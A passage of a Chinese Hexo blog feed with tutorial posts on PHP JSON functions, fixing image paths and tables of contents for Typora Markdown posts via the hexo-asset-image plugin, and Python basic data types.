$e-&gt;name &#x3D; &quot;yuting&quot;;</span><br><span class="line">   $e-&gt;hobbies  &#x3D; &quot;travel&quot;;</span><br><span class="line">   $e-&gt;birthdate &#x3D; date(&#39;m&#x2F;d&#x2F;Y h:i:s a&#39;, &quot;9&#x2F;16&#x2F;2002 8:30:03 a&quot;);</span><br><span class="line">   $e-&gt;birthdate &#x3D; date(&#39;m&#x2F;d&#x2F;Y h:i:s a&#39;, strtotime(&quot;9&#x2F;16&#x2F;2002 8:30:03&quot;));</span><br><span class="line"></span><br><span class="line">   echo json_encode($e);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：{“name”:”yuting”,”hobbies”:”travel”,”birthdate”:”09/16/2002 8:30:03 am”}</p><h4 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a>json_decode</h4><p>用于对 JSON 格式的字符串进行解码，并转换为 PHP 变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed json_decode ($json_string [,$assoc &#x3D; false [, $depth &#x3D; 512 [, $options &#x3D; 0 ]]])</span><br></pre></td></tr></table></figure><ul><li><strong>json_string</strong>: 待解码的 JSON 字符串，必须是 UTF-8 编码数据</li><li><strong>assoc</strong>: 当该参数为 TRUE 时，将返回数组，FALSE 时返回对象。</li><li><strong>depth</strong>: 整数类型的参数，它指定递归深度</li><li><strong>options</strong>: 二进制掩码，目前只支持 JSON_BIGINT_AS_STRING 。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Markdown上传博客文章的图片显示及目录生成问题</title>
    <link href="/2020/10/27/problem/"/>
    <url>/2020/10/27/problem/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#%E5%9B%BE%E7%89%87">图片</a><ul><li><a href="#%E6%B3%95%E4%B8%80">法一：</a><ul><li><a href="#%E4%B8%80%E8%A3%85%E6%8F%92%E4%BB%B6">一、装插件</a></li><li><a href="#%E4%BA%8C%E6%94%B9%E8%AE%BE%E7%BD%AE">二、改设置</a><ul><li><a href="#1typora%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%AE%BE%E7%BD%AE">1、Typora的图片根目录设置</a></li><li><a href="#2typora%E8%AE%BE%E7%BD%AE%E5%9B%BE%E7%89%87%E7%9A%84%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84">2、Typora设置图片的相对路径</a></li><li><a href="#3typora%E8%87%AA%E5%8A%A8%E5%A4%8D%E5%88%B6%E5%9B%BE%E7%89%87%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%E4%B8%8B">3、Typora自动复制图片到指定目录下</a></li></ul></li></ul></li><li><a href="#%E6%B3%95%E4%BA%8C%E9%80%82%E7%94%A8%E4%BA%8Emac">法二：(适用于mac)</a></li></ul></li><li><a href="#%E7%9B%AE%E5%BD%95">目录</a></li><li><a href="#%E5%B0%BE%E8%AE%B0">尾记</a></li></ul><p>刚发表第一篇博客文章时，发现在typora里写的带有图片及目录的文章更到博客里图片与目录就无法显示；为此找了许多方法，总结如下：</p><p>原因:由于上传的图片使用的是绝对路径或者相对路径，每次插入截图的图片时，默认都是将图片存在C盘中，当MD文件移动时，图片的链接就会失效，就会出现图片加载失败的问题。</p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><h3 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h3><h4 id="一、装插件"><a href="#一、装插件" class="headerlink" title="一、装插件"></a>一、装插件</h4><p>我们需要安装一个图片路径转换的插件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install https:&#x2F;&#x2F;github.com&#x2F;CodeFalling&#x2F;hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>插件的内容需要修改:</p><p>打开/node_modules/hexo-asset-image/index.js，将内容更换为下面的代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line">var cheerio &#x3D; require(&#39;cheerio&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;14480345&#x2F;how-to-get-the-nth-occurrence-in-a-string</span><br><span class="line">function getPosition(str, m, i) &#123;</span><br><span class="line">  return str.split(m, i).join(m).length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var version &#x3D; String(hexo.version).split(&#39;.&#39;);</span><br><span class="line">hexo.extend.filter.register(&#39;after_post_render&#39;, function(data)&#123;</span><br><span class="line">  var config &#x3D; hexo.config;</span><br><span class="line">  if(config.post_asset_folder)&#123;</span><br><span class="line">    var link &#x3D; data.permalink;</span><br><span class="line">if(version.length &gt; 0 &amp;&amp; Number(version[0]) &#x3D;&#x3D; 3)</span><br><span class="line">   var beginPos &#x3D; getPosition(link, &#39;&#x2F;&#39;, 1) + 1;</span><br><span class="line">else</span><br><span class="line">   var beginPos &#x3D; getPosition(link, &#39;&#x2F;&#39;, 3) + 1;</span><br><span class="line">&#x2F;&#x2F; In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;...&#x2F;about&#x2F;index.html&quot;.</span><br><span class="line">var endPos &#x3D; link.lastIndexOf(&#39;&#x2F;&#39;) + 1;</span><br><span class="line">    link &#x3D; link.substring(beginPos, endPos);</span><br><span class="line"></span><br><span class="line">    var toprocess &#x3D; [&#39;excerpt&#39;, &#39;more&#39;, &#39;content&#39;];</span><br><span class="line">    for(var i &#x3D; 0; i &lt; toprocess.length; i++)&#123;</span><br><span class="line">      var key &#x3D; toprocess[i];</span><br><span class="line"> </span><br><span class="line">      var $ &#x3D; cheerio.load(data[key], &#123;</span><br><span class="line">        ignoreWhitespace: false,</span><br><span class="line">        xmlMode: false,</span><br><span class="line">        lowerCaseTags: false,</span><br><span class="line">        decodeEntities: false</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      $(&#39;img&#39;).each(function()&#123;</span><br><span class="line">if ($(this).attr(&#39;src&#39;))&#123;</span><br><span class="line">&#x2F;&#x2F; For windows style path, we replace &#39;\&#39; to &#39;&#x2F;&#39;.</span><br><span class="line">var src &#x3D; $(this).attr(&#39;src&#39;).replace(&#39;\\&#39;, &#39;&#x2F;&#39;);</span><br><span class="line">if(!&#x2F;http[s]*.*|\&#x2F;\&#x2F;.*&#x2F;.test(src) &amp;&amp;</span><br><span class="line">   !&#x2F;^\s*\&#x2F;&#x2F;.test(src)) &#123;</span><br><span class="line">  &#x2F;&#x2F; For &quot;about&quot; page, the first part of &quot;src&quot; can&#39;t be removed.</span><br><span class="line">  &#x2F;&#x2F; In addition, to support multi-level local directory.</span><br><span class="line">  var linkArray &#x3D; link.split(&#39;&#x2F;&#39;).filter(function(elem)&#123;</span><br><span class="line">return elem !&#x3D; &#39;&#39;;</span><br><span class="line">  &#125;);</span><br><span class="line">  var srcArray &#x3D; src.split(&#39;&#x2F;&#39;).filter(function(elem)&#123;</span><br><span class="line">return elem !&#x3D; &#39;&#39; &amp;&amp; elem !&#x3D; &#39;.&#39;;</span><br><span class="line">  &#125;);</span><br><span class="line">  if(srcArray.length &gt; 1)</span><br><span class="line">srcArray.shift();</span><br><span class="line">  src &#x3D; srcArray.join(&#39;&#x2F;&#39;);</span><br><span class="line">  $(this).attr(&#39;src&#39;, config.root + link + src);</span><br><span class="line">  console.info&amp;&amp;console.info(&quot;update link as:--&gt;&quot;+config.root + link + src);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">console.info&amp;&amp;console.info(&quot;no src attr, skipped...&quot;);</span><br><span class="line">console.info&amp;&amp;console.info($(this));</span><br><span class="line">&#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      data[key] &#x3D; $.html();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>操作完成后，每次用hexo  new XXX 创建新文章时列表会多出一个与文章同名的文件夹：</p><p><img src="/2020/10/27/problem/1.jpg" alt="1"></p><p>接下来打开_config.yml文件，修改下述内容，将false改成true。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure><p>将文章需要用到的图片存入同名文件夹中，但仅仅这样还是无法显示图片。</p><h4 id="二、改设置"><a href="#二、改设置" class="headerlink" title="二、改设置"></a>二、改设置</h4><h5 id="1、Typora的图片根目录设置"><a href="#1、Typora的图片根目录设置" class="headerlink" title="1、Typora的图片根目录设置"></a>1、Typora的图片根目录设置</h5><p>点击 文件—偏好设置—图像</p><p>默认是“无特殊操作”,更改为“复制图片到./${filename}.assets文件夹”</p><h5 id="2、Typora设置图片的相对路径"><a href="#2、Typora设置图片的相对路径" class="headerlink" title="2、Typora设置图片的相对路径"></a>2、Typora设置图片的相对路径</h5><p>勾选下面两项“对本地位置的图片应用上述规则”和“优先使用相对路径”。</p><p><img src="/2020/10/27/problem/2.jpg" alt="2"></p><p>更改设置后每次在新建一个md文件时，在md文档所在文件夹中就会自动创建一个与该文件同名的.assets的文件夹，复制的图片也会自动保存到其中。</p><p><img src="/2020/10/27/problem/3.jpg" alt="3"></p><h5 id="3、Typora自动复制图片到指定目录下"><a href="#3、Typora自动复制图片到指定目录下" class="headerlink" title="3、Typora自动复制图片到指定目录下"></a>3、Typora自动复制图片到指定目录下</h5><p><img src="/2020/10/27/problem/4.jpg" alt="4"></p><p>之后的图片路径会变成类似如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![黑客](Cyber.assets&#x2F;黑客.jpg)</span><br></pre></td></tr></table></figure><h3 id="法二：-适用于mac"><a href="#法二：-适用于mac" class="headerlink" title="法二：(适用于mac)"></a>法二：(适用于mac)</h3><ol><li>与法一类似，在改设置的步骤一时多勾上第四条：允许根据YML设置自动上床图片。</li><li>需再安装图床应用 iPic。</li><li>在改设置的第三步骤时勾选如下:</li></ol><p><img src="/2020/10/27/problem/5.jpg" alt="5"></p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>markdown可以使用<code>[TOC]</code>来自动生成markdown文件的标题目录，但是github却不支持<code>[TOC]</code>标签。以下针对vscode，安装了Markdown All in One插件。下载地址：<a href="https://www.vsixhub.com/vsix/1925/%E3%80%82%E7%84%B6%E5%90%8E%E5%AF%B9%E4%BA%8E%E4%BD%A0%E8%A6%81%E7%94%9F%E6%88%90%E7%9B%AE%E5%BD%95%E7%9A%84md%E6%96%87%E4%BB%B6%EF%BC%8Cvscode%E5%BF%AB%E6%8D%B7%E9%94%AE">https://www.vsixhub.com/vsix/1925/。然后对于你要生成目录的md文件，vscode快捷键</a> ctrl + shift + p 打开如下</p><p><img src="/2020/10/27/problem/6.jpg" alt="6"></p><p>选择<code> create table of contents</code> 回车即可生成目录。</p><h2 id="尾记"><a href="#尾记" class="headerlink" title="尾记"></a>尾记</h2><p>最开始图片显示不了的时候特别难受，尤其第一篇文章Markdown中图片很多；当时上百度知乎之类的没有找到解决方案（有的就只有一半，有的根本不行 ),后来搁置了，靶场的环境建完后，又绕回来纠结这个问题，终于找到正解了，平平无奇小天才<del>~</del></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python(一)</title>
    <link href="/2020/10/24/python/"/>
    <url>/2020/10/24/python/</url>
    
    <content type="html"><![CDATA[<h1>Python</h1><p>在一些教程中，在Python文件的行首会写上<code>#!/usr/bin/python3</code>它的作用是用来指定Python的解释器，并用只能应用于Linux、Mac等系统中，Windows系统会忽略这个注释。效果等同于<code>#!/usr/bin/env python3</code>其作用就是让env去查找python3的绝对路径替换作为解释器路径。</p><p><a href="#python">Python</a></p><ul><li><a href="#python%E8%A7%A3%E9%87%8A%E5%99%A8">Python解释器</a><ul><li><a href="#%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%BC%96%E7%A8%8B">交互式编程</a></li><li><a href="#%E8%84%9A%E6%9C%AC%E5%BC%8F%E7%BC%96%E7%A8%8B">脚本式编程</a></li></ul></li><li><a href="#%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">基本数据类型</a><ul><li><a href="#%E5%A4%9A%E4%B8%AA%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC">多个变量赋值</a></li></ul></li><li><a href="#%E6%A0%87%E5%87%86%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">标准数据类型</a><ul><li><a href="#number">Number</a></li><li><a href="#string">String</a></li><li><a href="#list">List</a></li><li><a href="#tuple">Tuple</a></li><li><a href="#set">Set</a></li><li><a href="#%E6%B7%BB%E5%8A%A0%E5%85%83%E7%B4%A0">添加元素</a></li><li><a href="#%E7%A7%BB%E9%99%A4%E5%85%83%E7%B4%A0">移除元素</a></li><li><a href="#%E6%B8%85%E7%A9%BA%E9%9B%86%E5%90%88">清空集合</a></li><li><a href="#%E6%97%A0%E9%99%90%E6%9E%81%E5%B5%8C%E5%A5%97">无限极嵌套</a></li></ul></li><li><a href="#python-%E8%BF%90%E7%AE%97%E7%AC%A6">Python 运算符</a><ul><li><a href="#%E6%88%90%E5%91%98%E8%BF%90%E7%AE%97%E7%AC%A6">成员运算符</a></li><li><a href="#%E8%BA%AB%E4%BB%BD%E8%BF%90%E7%AE%97%E7%AC%A6">身份运算符</a></li><li><a href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7">运算符优先级</a></li></ul></li><li><a href="#%E6%95%B0%E5%AD%97">数字</a><ul><li><a href="#%E6%95%B0%E5%AD%97%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">数字类型转换</a></li><li><a href="#round%E6%B5%AE%E7%82%B9%E6%95%B0%E5%AD%98%E5%82%A8%E6%9C%89%E7%82%B9%E5%A5%87%E6%80%AA">round（浮点数存储有点奇怪）</a></li><li><a href="#-%E5%92%8C--%E7%9A%84%E4%B8%8D%E5%90%8C"><strong>+=</strong> 和 <strong>=+</strong> 的不同</a></li></ul></li><li><a href="#python-%E5%AD%97%E7%AC%A6%E4%B8%B2">Python 字符串</a><ul><li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9B%B4%E6%96%B0">字符串更新</a></li><li><a href="#%E4%B8%89%E5%BC%95%E5%8F%B7">三引号</a></li></ul></li></ul><h2 id="Python解释器"><a class="header-anchor" href="#Python解释器">¶</a>Python解释器</h2><h4 id="交互式编程"><a class="header-anchor" href="#交互式编程">¶</a>交互式编程</h4><p>需要打开 cmd 窗口（命令提示符窗口），在窗口中键入<code>python</code>,回车，进入了交互式编程，此时我们直接输入 python 语句，就可以得到运行的结果。</p><h4 id="脚本式编程"><a class="header-anchor" href="#脚本式编程">¶</a>脚本式编程</h4><p>先把 python 语句写好，保存在后缀为 .py 的文件里，然后从外部调用这个文件。它也可以使用 cmd 窗口进行调用，<strong>与交互式编程不同的是，不能在cmd窗口内输入python加回车来进入交互模式</strong>。</p><h2 id="基本数据类型"><a class="header-anchor" href="#基本数据类型">¶</a>基本数据类型</h2><h4 id="多个变量赋值"><a class="header-anchor" href="#多个变量赋值">¶</a>多个变量赋值</h4><p>python可实现多个变量赋值</p><pre><code class="hljs nix"><span class="hljs-attr">a</span> = <span class="hljs-attr">b</span> = <span class="hljs-attr">c</span> = <span class="hljs-number">1</span></code></pre><p>or</p><pre><code class="hljs apache"><span class="hljs-attribute">a</span>, b, c = <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-string">&quot;blackpink&quot;</span></code></pre><h2 id="标准数据类型"><a class="header-anchor" href="#标准数据类型">¶</a>标准数据类型</h2><ul><li>**不可变数据（3 个）：**Number（数字）、String（字符串）、Tuple（元组）；</li><li>**可变数据（3 个）：**List（列表）、Dictionary（字典）、Set（集合）。</li></ul><h4 id="Number"><a class="header-anchor" href="#Number">¶</a>Number</h4><p>有int、float、bool、complex</p><p>type() 函数可以用来查询变量所指的对象类型。</p><pre><code class="hljs haskell">&gt;&gt;&gt; a, b, c, d = <span class="hljs-number">20</span>, <span class="hljs-number">9.5</span>, <span class="hljs-type">True</span>, <span class="hljs-number">5</span>+<span class="hljs-number">6</span>j&gt;&gt;&gt; print(<span class="hljs-class"><span class="hljs-keyword">type</span>(<span class="hljs-title">a</span>), <span class="hljs-keyword">type</span>(<span class="hljs-title">b</span>), <span class="hljs-keyword">type</span>(<span class="hljs-title">c</span>), <span class="hljs-keyword">type</span>(<span class="hljs-title">d</span>))</span>&lt;<span class="hljs-keyword">class</span> &#x27;int&#x27;&gt; &lt;<span class="hljs-keyword">class</span> &#x27;float&#x27;&gt; &lt;<span class="hljs-keyword">class</span> &#x27;bool&#x27;&gt; &lt;<span class="hljs-keyword">class</span> &#x27;complex&#x27;&gt;</code></pre><p>也可用 isinstance 来判断</p><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; a = <span class="hljs-number">5</span>+<span class="hljs-number">6</span>j<span class="hljs-meta">&gt;&gt;</span>&gt; isinstance(a, int)Flase<span class="hljs-meta">&gt;&gt;</span>&gt;</code></pre><p>数值的除法包含两个运算符：<strong>/</strong> 返回一个浮点数，<strong>//</strong> 返回一个整数。在混合计算时，Python会把整型转换成为浮点数。</p><h4 id="String"><a class="header-anchor" href="#String">¶</a>String</h4><p>字符串用单引号 <strong>’</strong> 或双引号 <strong>&quot;</strong> 括起来，同时使用反斜杠 \转义特殊字符。</p><p>字符串截取的语法格式如下：</p><pre><code class="hljs css">变量<span class="hljs-selector-attr">[头下标:尾下标]</span></code></pre><p>索引值以 0 为开始值，-1 为从末尾的开始位置。</p><pre><code class="hljs hsp"><span class="hljs-keyword">str</span> = <span class="hljs-string">&#x27;blackpink&#x27;</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>)          <span class="hljs-meta"># 输出字符串</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>[<span class="hljs-number">0</span>:<span class="hljs-number">-1</span>])    <span class="hljs-meta"># 输出第一个到倒数第二个的所有字符</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>[<span class="hljs-number">0</span>])       <span class="hljs-meta"># 输出字符串第一个字符</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>])     <span class="hljs-meta"># 输出从第三个开始到第五个的字符</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>[<span class="hljs-number">2</span>:])      <span class="hljs-meta"># 输出从第三个开始的后的所有字符</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span> * <span class="hljs-number">2</span>)      <span class="hljs-meta"># 输出字符串两次，也可以写成 print (<span class="hljs-number">2</span> * str)</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span> + <span class="hljs-string">&quot;TEST&quot;</span>) <span class="hljs-meta"># 连接字符串</span></code></pre><p>输出如下：</p><pre><code class="hljs mipsasm"><span class="hljs-keyword">blackpink</span><span class="hljs-keyword">blackpin</span><span class="hljs-keyword">b</span><span class="hljs-keyword">ack</span><span class="hljs-keyword">ackpink</span><span class="hljs-keyword">blackpinkblackpink</span><span class="hljs-keyword">blackpinkTEST</span></code></pre><p>Python 使用反斜杠<code> \</code> 转义特殊字符，如不让反斜杠发生转义，可在字符串前面添加一个 <code>r</code>，表示原始字符串,反斜杠<code>\</code>可以作为续行符，表示下一行是上一行的延续;也可以使用 <strong>“”“…”“”</strong> 或者 <strong>‘’‘…’‘’</strong> 跨越多行。</p><h4 id="List"><a class="header-anchor" href="#List">¶</a>List</h4><p>列表是写在方括号 <strong>[]</strong> 之间用逗号分隔开的元素列表。列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表，语法与string相同。</p><pre><code class="hljs livescript"><span class="hljs-keyword">list</span> = [ <span class="hljs-string">&#x27;abcd&#x27;</span>, <span class="hljs-number">365</span> , <span class="hljs-number">2.83</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">89.2</span> ]tinylist = [<span class="hljs-number">123</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>]<span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span>)            <span class="hljs-comment"># 输出完整列表</span><span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span>[<span class="hljs-number">0</span>])         <span class="hljs-comment"># 输出列表第一个元素</span><span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span>[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>])       <span class="hljs-comment"># 从第二个开始输出到第三个元素</span><span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span>[<span class="hljs-number">2</span>:])        <span class="hljs-comment"># 输出从第三个元素开始的所有元素</span><span class="hljs-built_in">print</span> (tinylist * <span class="hljs-number">2</span>)    <span class="hljs-comment"># 输出两次列表</span><span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span> + tinylist) <span class="hljs-comment"># 连接列表</span></code></pre><p>输出如下:</p><pre><code class="hljs angelscript">[<span class="hljs-string">&#x27;abcd&#x27;</span>, <span class="hljs-number">365</span>, <span class="hljs-number">2.83</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">89.2</span>]abcd[<span class="hljs-number">365</span>, <span class="hljs-number">2.83</span>][<span class="hljs-number">2.83</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">89.2</span>][<span class="hljs-number">123</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">123</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>][<span class="hljs-string">&#x27;abcd&#x27;</span>, <span class="hljs-number">365</span>, <span class="hljs-number">2.83</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">89.2</span>, <span class="hljs-number">123</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>]</code></pre><p>列表中的元素可以删除</p><pre><code class="hljs applescript">del <span class="hljs-built_in">list</span>[]</code></pre><p>可以变化</p><pre><code class="hljs applescript"><span class="hljs-built_in">list</span>[] = 改变的值</code></pre><p>Python 列表截取可以接收第三个参数，参数作用是截取的步长，以下实例在索引 1 到索引 4 的位置并设置为步长为 2（间隔一个位置）来截取字符串。</p><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; letters = [<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>]<span class="hljs-meta">&gt;&gt;</span>&gt; letters[<span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span>][<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>]</code></pre><p>如果第三个参数为负数表示逆向读取</p><p>inputWords[-1::-1] 有三个参数， 第一个参数 -1 表示最后一个元素， 第二个参数为空，表示移动到列表末尾，第三个参数为步长，-1 表示逆向。</p><h4 id="Tuple"><a class="header-anchor" href="#Tuple">¶</a>Tuple</h4><p>tuple的元素不能修改,但可以对元组进行连接组合，</p><pre><code class="hljs smali">tup3 = tup1 + tup2</code></pre><p>元组应写在小括号 <strong>()</strong> 里，元素之间用逗号隔开,元组中的元素类型也可以不相同。</p><p>元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组：</p><pre><code class="hljs dos"><span class="hljs-built_in">del</span> tup</code></pre><p>特殊情况:</p><pre><code class="hljs ini"><span class="hljs-attr">tup1</span> = ()    <span class="hljs-comment"># 空元组</span><span class="hljs-attr">tup2</span> = (<span class="hljs-number">20</span>,) <span class="hljs-comment"># 一个元素，需要在元素后添加逗号</span></code></pre><h4 id="Set"><a class="header-anchor" href="#Set">¶</a>Set</h4><p>使用大括号 <strong>{ }</strong> 或者 <strong>set()</strong> 函数创建集合,<strong>创建一个空集合必须用 <code>set()</code>而不是 <code>&#123; &#125;</code>，因<code>&#123; &#125;</code> 是用来创建一个空字典。</strong></p><pre><code class="hljs bash">b = <span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;blackpink&#x27;</span>)a = <span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;blackpink in your area&#x27;</span>)<span class="hljs-built_in">print</span>(a)<span class="hljs-built_in">print</span>(a - b)     <span class="hljs-comment"># a 和 b 的差集</span><span class="hljs-built_in">print</span>(a | b)     <span class="hljs-comment"># a 和 b 的并集</span><span class="hljs-built_in">print</span>(a &amp; b)     <span class="hljs-comment"># a 和 b 的交集</span><span class="hljs-built_in">print</span>(a ^ b)     <span class="hljs-comment"># a 和 b 中不同时存在的元素</span></code></pre><p>输出如下：</p><pre><code class="hljs 1c">&#123;&#x27;y&#x27;, &#x27;e&#x27;, &#x27;n&#x27;, &#x27;k&#x27;, &#x27;a&#x27;, &#x27;r&#x27;, &#x27;u&#x27;, &#x27;l&#x27;, &#x27;b&#x27;, &#x27;o&#x27;, &#x27; &#x27;, &#x27;c&#x27;, &#x27;p&#x27;, &#x27;i&#x27;&#125;&#123;&#x27;e&#x27;, &#x27;r&#x27;, &#x27;u&#x27;, &#x27;o&#x27;, &#x27; &#x27;, &#x27;y&#x27;&#125;&#123;&#x27;e&#x27;, &#x27;u&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;y&#x27;, &#x27;p&#x27;, &#x27;i&#x27;, &#x27;n&#x27;, &#x27;k&#x27;, &#x27;a&#x27;, &#x27;r&#x27;, &#x27;b&#x27;, &#x27; &#x27;, &#x27;c&#x27;&#125;&#123;&#x27;n&#x27;, &#x27;k&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;l&#x27;, &#x27;c&#x27;, &#x27;p&#x27;, &#x27;i&#x27;&#125;&#123;&#x27;y&#x27;, &#x27;e&#x27;, &#x27;r&#x27;, &#x27;u&#x27;, &#x27;o&#x27;, &#x27; &#x27;&#125;</code></pre><h4 id="添加元素"><a class="header-anchor" href="#添加元素">¶</a>添加元素</h4><p>语法:</p><pre><code class="hljs sas">s.<span class="hljs-meta">add</span>( <span class="hljs-meta">x</span> ) <span class="hljs-meta">or</span> s.u<span class="hljs-meta">pdate(</span> <span class="hljs-meta">x</span> )</code></pre><h4 id="移除元素"><a class="header-anchor" href="#移除元素">¶</a>移除元素</h4><p>语法:</p><pre><code class="hljs sas">s.<span class="hljs-meta">remove</span>( <span class="hljs-meta">x</span> ) <span class="hljs-meta">or</span> s.discard( <span class="hljs-meta">x</span> )</code></pre><h4 id="清空集合"><a class="header-anchor" href="#清空集合">¶</a>清空集合</h4><p>语法:</p><pre><code class="hljs arduino">s.<span class="hljs-built_in">clear</span>()</code></pre><p>字典是一种映射类型，字典用 <strong>{ }</strong> 标识，它是一个无序的 <strong>键(key) : 值(value)</strong> 的集合。键(key)必须使用不可变类型。在同一个字典中，键(key)必须是唯一的，值则不用。</p><p>删除：</p><pre><code class="hljs mipsasm">del <span class="hljs-keyword">dict[&#x27;Name&#x27;] </span><span class="hljs-comment"># 删除键 &#x27;Name&#x27;</span><span class="hljs-keyword">dict.clear() </span>    <span class="hljs-comment"># 清空字典</span>del <span class="hljs-keyword">dict </span>        <span class="hljs-comment"># 删除字典</span></code></pre><p><strong>不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住</strong></p><h4 id="无限极嵌套"><a class="header-anchor" href="#无限极嵌套">¶</a>无限极嵌套</h4><p>查询语法：</p><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> 类别[<span class="hljs-string">&#x27;&#x27;</span>]:    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">i</span>)</span></code></pre><h2 id="Python-运算符"><a class="header-anchor" href="#Python-运算符">¶</a>Python 运算符</h2><h4 id="成员运算符"><a class="header-anchor" href="#成员运算符">¶</a>成员运算符</h4><table><thead><tr><th 